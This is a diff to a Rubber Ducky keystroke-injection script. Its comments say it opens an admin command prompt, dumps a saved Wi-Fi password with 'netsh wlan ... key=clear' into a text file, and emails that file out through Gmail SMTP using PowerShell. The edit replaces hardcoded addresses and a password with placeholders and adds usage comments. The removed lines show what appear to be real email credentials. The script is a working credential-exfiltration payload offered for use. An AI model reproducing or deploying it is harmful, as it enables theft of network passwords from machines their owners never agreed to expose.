@@ -1,4 +1,4 @@
-REM AUTHOR: ELIJAH CANNON
+REM AUTHOR: ELIJAH CANNON fixed and improved by DeDogeGod
 REM REPLACE: 'NAME' with SSID, 'from' with your email you're sending from, 'password' with your email password, and 
 REM 'to' with email you are sending to.
 REM DETAILS: Opens cmd(Admin), obtains wifi password, and saves it to a txt file. 
@@ -14,7 +14,7 @@ DELAY 300
 ENTER
 DELAY 500
 REM ---------------------------Replace 'NAME' with SSID(Name of Wi-fi)
-STRING netsh wlan show profile 458 key=clear | findstr Key > C:\wifiPassword.txt
+STRING netsh wlan show profile NAME key=clear | findstr Key > C:\wifiPassword.txt
 DELAY 100
 ENTER
 DELAY 500
@@ -31,16 +31,18 @@ STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPInfo.EnableSsl = $true
 ENTER
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('siho9898"gmail.com', 'rubberducky514');
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('email"gmail.com', 'password');
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
-STRING $ReportEmail.From = 'siho9898"gmail.com'
+STRING $ReportEmail.From = 'email"gmail.com'
 ENTER
-STRING $ReportEmail.To.Add('wallpapeco"gmail.com')
+STRING $ReportEmail.To.Add('email"gmail.com')
 ENTER
-STRING $ReportEmail.Subject = 'Wi-fi Password'
+REM --------------------------- Look below
+STRING $ReportEmail.Subject = 'Change to whatever subject you want'
 ENTER
+REM ----------------------- Change to whatever you want the body of the text to say
 STRING $ReportEmail.Body = 'Attached is a file containing the wifi password'
 ENTER
 STRING $ReportEmail.Attachments.Add('c:\wifiPassword.txt')
